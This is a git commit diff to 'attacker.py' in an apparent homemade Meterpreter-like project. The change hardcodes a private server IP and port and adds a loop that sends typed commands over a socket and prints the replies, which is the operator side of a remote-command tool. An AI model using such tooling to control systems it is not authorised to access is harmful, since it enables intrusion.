b8ea004d58725e4b1c589e7a6ad9f2f48b074de4
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2021-12-28 12:13:38 +0100

    Update attacker.py

--- py/madeherpreter/attacker.py
+++ py/madeherpreter/attacker.py
@@ -3,32 +3,21 @@ __author__ = 'RetR0'
 import threading
 import socket
 
-host = input ("Enter the IP of the host server :")
-port = int(input ("Enter the listening port of the host server :"))
+host = '192.168.248.158'
+port = int('55555')
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect ((host, port))
 
+def reciv():
+    message = client.recv(2048)
+    message = message.decode()
+    print (message)
 
 def main():
     while True:
-        try:
-            message = client.recv(3072)   
-            print(message)         
-        except:
-            print("\nDisconected from the server !")
-            client.close()
-            break
+        a = bytearray(input("command : ").encode('utf-8'))
+        client.send(a)
+        reciv()
 
-def send_message():
-    while True:
-        messa = input("")
-        message = messa
-        client.send(message)
-
-
-main_thread = threading.Thread(target=main)
-main_thread.start()
-
-send_message_thread = threading.Thread(target=send_message)
-send_message_thread.start()
+main()
